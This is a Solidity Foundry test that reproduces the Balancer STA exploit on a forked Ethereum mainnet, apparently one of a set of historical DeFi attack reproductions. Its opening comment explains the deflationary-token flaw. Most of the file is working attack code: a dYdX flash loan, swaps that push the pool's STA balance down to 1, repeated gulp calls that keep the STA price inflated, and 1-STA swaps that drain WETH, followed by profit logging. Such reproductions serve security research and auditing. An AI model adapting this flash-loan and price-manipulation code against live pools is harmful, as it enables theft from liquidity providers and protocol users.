// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/console2.sol";
import "forge-std/Test.sol";
import "../interface.sol";

/*
Balancer STA Exploit

Vulnerability principle: The incompatibility issue of deflationary tokens(STA) on Balancer. When users exchange deflationary tokens,
the contract does not validate the received tokens, leading to incorrect balance records.

Attackers can exploit this to create price deviations and profit from them. Exploitation process:
1. The attacker borrows a large amount of WETH from DYDX through flash loans.
2. The attacker continuously calls the swapExactAmountIn function to control the amount of STA tokens in the Balancer pool to 1,
    thereby increasing the price of STA for exchanging other tokens.
3. The attacker exchanges 1 STA for WETH and after each exchange, calls the gulp function to overwrite the STA balance,
    keeping the price high for STA to WETH exchanges.
4. Repay the flash loan and exit with profits.

Attack Tx: https://etherscan.io/tx/0x013be97768b702fe8eccef1a40544d5ecb3c1961ad5f87fee4d16fdc08c78106
*/

struct AccountInfo {
    address owner; // The address that owns the account
    uint256 number; // A nonce that allows a single address to control many accounts
}

interface IUniswapV2Router02 {
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
}

library Actions {
    enum ActionType {
        Deposit, // supply tokens
        Withdraw, // borrow tokens
        Transfer, // transfer balance between accounts
        Buy, // buy an amount of some token (publicly)
        Sell, // sell an amount of some token (publicly)
        Trade, // trade tokens against another account
        Liquidate, // liquidate an undercollateralized or expiring account
        Vaporize, // use excess tokens to zero-out a completely negative account
        Call // send arbitrary data to an address
    }

    struct ActionArgs {
        ActionType actionType;
        uint256 accountId;
        Types.AssetAmount amount;
        uint256 primaryMarketId;
        uint256 secondaryMarketId;
        address otherAddress;
        uint256 otherAccountId;
        bytes data;
    }
}

library Types {
    enum AssetDenomination {
        Wei, // the amount is denominated in wei
        Par // the amount is denominated in par
    }

    enum AssetReference {
        Delta, // the amount is given as a delta from the current value
        Target // the amount is given as an exact number to end up at
    }

    struct AssetAmount {
        bool sign; // true if positive
        AssetDenomination denomination;
        AssetReference ref;
        uint256 value;
    }
}

interface ISoloMargin {
    function operate(
        AccountInfo[] memory accounts,
        Actions.ActionArgs[] memory actions
    ) external;
}

interface BPool {
    function swapExactAmountIn(
        address tokenIn,
        uint tokenAmountIn,
        address tokenOut,
        uint minAmountOut,
        uint maxPrice
    ) external returns (uint tokenAmountOut, uint spotPriceAfter);

    function gulp(address token) external;

    function getBalance(address token) external view returns (uint);

    function swapExactAmountOut(
        address tokenIn,
        uint maxAmountIn,
        address tokenOut,
        uint tokenAmountOut,
        uint maxPrice
    ) external;
}

contract BalancerExp is Test {
    address dydx = 0x1E0447b19BB6EcFdAe1e4AE1694b0C3659614e4e;
    address weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address sta = 0xa7DE087329BFcda5639247F96140f9DAbe3DeED1;
    BPool bpool = BPool(0x0e511Aa1a137AaD267dfe3a6bFCa0b856C1a3682);
    address pancakeV2Router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    uint public constant BONE = 10 ** 18;
    uint public constant MAX_IN_RATIO = BONE / 2;

    function setUp() public {
        vm.createSelectFork("mainnet", 10_355_806);
    }

    function testExploit() public {
        // approve
        IERC20(weth).approve(dydx, type(uint256).max);
        IERC20(weth).approve(address(bpool), type(uint256).max);
        IERC20(sta).approve(address(bpool), type(uint256).max);
        IERC20(sta).approve(pancakeV2Router, type(uint256).max);

        emit log_named_decimal_uint(
            "[Before Attack] Attacker WETH Balance : ",
            (IERC20(weth).balanceOf(address(this))),
            18
        );
        emit log_named_decimal_uint(
            "[Before Attack] Attacker STA Balance : ",
            (IERC20(sta).balanceOf(address(this))),
            18
        );

        // attack
        attack();

        // check profit
        emit log_named_decimal_uint(
            "[After Attack] Attacker WETH Balance : ",
            (IERC20(weth).balanceOf(address(this))),
            18
        );
        emit log_named_decimal_uint(
            "[After Attack] Attacker STA Balance : ",
            (IERC20(sta).balanceOf(address(this))),
            18
        );
    }

    function bmul(uint a, uint b) internal pure returns (uint) {
        uint c0 = a * b;
        uint c1 = c0 + (BONE / 2);
        uint c2 = c1 / BONE;
        return c2;
    }

    // take flash loan from dydx
    function attack() private {
        AccountInfo[] memory accounts = new AccountInfo[](1);
        {
            accounts[0].owner = address(this);
            accounts[0].number = 1;
        }

        Actions.ActionArgs[] memory actions = new Actions.ActionArgs[](3);
        {
            uint wethAmount = IERC20(weth).balanceOf(dydx);
            actions[0].actionType = Actions.ActionType.Withdraw;
            actions[0].amount.value = wethAmount;
            actions[0].otherAddress = address(this);

            actions[1].actionType = Actions.ActionType.Call;
            actions[1].otherAddress = address(this);

            actions[2].actionType = Actions.ActionType.Deposit;
            actions[2].amount.sign = true;
            actions[2].amount.value = wethAmount + 2;
            actions[2].otherAddress = address(this);
        }

        ISoloMargin(dydx).operate(accounts, actions);
    }

    function callFunction(
        address, // sender
        AccountInfo memory, // accountInfo
        bytes memory // data
    ) external {
        // swap weth to sta
        bpool.gulp(weth);
        uint MaxinRatio = bmul(bpool.getBalance(weth), MAX_IN_RATIO);
        bpool.swapExactAmountIn(weth, MaxinRatio - 1e18, sta, 0, 9999 * 1e18);
        bpool.swapExactAmountIn(
            sta,
            IERC20(sta).balanceOf(address(this)),
            weth,
            0,
            9999 * 1e18
        );
        MaxinRatio = bmul(bpool.getBalance(weth), MAX_IN_RATIO);
        bpool.swapExactAmountIn(
            weth,
            (MaxinRatio * 50) / 100,
            sta,
            0,
            9999 * 1e18
        );
        bpool.swapExactAmountIn(
            sta,
            IERC20(sta).balanceOf(address(this)),
            weth,
            0,
            9999 * 1e18
        );
        MaxinRatio = bmul(bpool.getBalance(weth), MAX_IN_RATIO);
        bpool.swapExactAmountIn(
            weth,
            (MaxinRatio * 25) / 100,
            sta,
            0,
            9999 * 1e18
        );
        bpool.swapExactAmountIn(
            sta,
            IERC20(sta).balanceOf(address(this)),
            weth,
            0,
            9999 * 1e18
        );

        for (uint i = 0; i < 16; i++) {
            MaxinRatio = bmul(bpool.getBalance(weth), MAX_IN_RATIO);
            if ((i + 1) < 9) {
                bpool.swapExactAmountIn(
                    weth,
                    (MaxinRatio * (i + 1) * 10) / 100,
                    sta,
                    0,
                    9999 * 1e18
                );
            } else {
                bpool.swapExactAmountIn(
                    weth,
                    (MaxinRatio * 95) / 100,
                    sta,
                    0,
                    9999 * 1e18
                );
            }
        }

        require(
            IERC20(sta).balanceOf(address(this)) > 0,
            "swap weth to sta failed"
        );

        bpool.swapExactAmountOut(
            weth,
            99999999999 * 1e18,
            sta,
            IERC20(sta).balanceOf(address(bpool)) - 1,
            99999 * 1e18
        );
        bpool.gulp(sta);

        // swap sta to weth
        for (uint j = 0; j < 20; j++) {
            MaxinRatio = bmul(bpool.getBalance(sta), MAX_IN_RATIO);
            bpool.swapExactAmountIn(sta, 1, weth, 0, 9999 * 1e18);
            bpool.gulp(sta);
        }
    }

    function donate() public payable {}

    receive() external payable {}
}
